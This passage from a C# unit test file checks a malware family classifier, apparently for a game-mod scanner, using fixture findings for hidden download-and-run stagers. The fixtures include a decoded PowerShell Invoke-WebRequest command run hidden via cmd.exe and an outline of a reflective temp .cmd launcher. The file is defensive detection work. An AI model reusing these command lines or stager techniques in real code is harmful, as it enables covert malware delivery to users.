            e.Pattern == DataFlowPattern.DynamicCodeLoading.ToString());
    }

    [Fact]
    public void Classify_WithHexRemoteConfigReflectiveTempCmdStager_ReturnsBehaviorMatch()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("Unity.Loader",
                "Detected cross-method hex remote config reflective temp command stager: hex-encoded remote command config URLs, WebClient.DownloadString, Path.GetTempFileName + .cmd, File.WriteAllText, reflected ProcessStartInfo cmd.exe /c launch, WindowStyle Hidden, and MethodInfo.Invoke.",
                Severity.Critical)
            {
                RuleId = "ObfuscatedReflectiveExecutionRule",
                CodeSnippet = "remote config: https://pasteee.dev/...; download: System.Net.WebClient.DownloadString; staging: GetTempFileName + .cmd; write: File.WriteAllText; execution: ProcessStartInfo FileName=cmd.exe Arguments=/c WindowStyle=Hidden UseShellExecute=True; reflection invoke: MethodInfo.Invoke"
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-hex-remote-config-tempcmd-stager-v1");
        matches[0].VariantId.Should().Be("hex-config-reflective-tempcmd-hidden-cmd");
        matches[0].MatchedRules.Should().Contain("ObfuscatedReflectiveExecutionRule");
    }

    [Fact]
    public void Classify_WithAssemblyDescriptionEncodedHiddenProcessLauncher_ReturnsMetadataLoaderVariant()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("Assembly Metadata: AssemblyDescriptionAttribute",
                "Hidden multi-level encoded payload in assembly metadata. Decoded: System.Diagnostics.ProcessStartInfo cmd.exe /c powershell -Command \"Invoke-WebRequest -OutFile C:\\ProgramData\\IntelDriver\\windows.cmd\" WindowStyle Hidden CreateNoWindow",
                Severity.Critical)
            {
                RuleId = "EncodedStringLiteralRule",
                CodeSnippet = "Encoded length: 1024\nDecoded: Start System.Diagnostics.Process System.Diagnostics.ProcessStartInfo FileName Arguments UseShellExecute WindowStyle Hidden CreateNoWindow cmd.exe /c powershell -Command \"Invoke-WebRequest -OutFile C:\\ProgramData\\IntelDriver\\windows.cmd\""
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-obfuscated-metadata-loader-v2");
        matches[0].VariantId.Should().Be("assembly-description-encoded-hidden-launcher");
    }

    [Fact]
    public void Classify_WithNoKnownSignals_ReturnsNoMatches()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("Legit.Mod.Start", "Opens explorer for a local folder.", Severity.Low)
            {
                RuleId = "ProcessStartRule"
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().BeEmpty();
    }
}
